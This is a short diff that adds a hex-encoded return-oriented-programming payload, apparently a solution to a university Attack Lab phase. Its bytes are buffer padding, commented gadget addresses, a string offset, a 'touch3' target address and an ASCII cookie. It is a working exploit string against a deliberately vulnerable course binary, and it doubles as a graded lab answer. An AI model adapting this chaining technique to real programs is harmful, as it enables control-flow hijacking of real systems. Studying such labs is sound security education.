@@ -1,0 +1,16 @@
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 /* padding */ 
+a0 19 40 00 00 00 00 00 /* movq %rsp, %rax */
+6d 19 40 00 00 00 00 00 /* movq %rax, %rdi (use movq so that 8-byte %rsp address won't be lost)*/
+48 19 40 00 00 00 00 00 /* popq %rax */
+48 00 00 00 00 00 00 00 /* offset from line 6 to cookie string in ASCII */
+7e 19 40 00 00 00 00 00 /* movl %eax, %ecx */
+f8 19 40 00 00 00 00 00 /* movl %ecx, %edx */
+14 1a 40 00 00 00 00 00 /* movl %edx, %esi */
+78 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1), %rax */
+6d 19 40 00 00 00 00 00 /* movq %rax, %rdi */
+af 18 40 00 00 00 00 00 /* touch3 address */
+33 36 36 31 61 39 39 34 /* cookie string in ASCII */
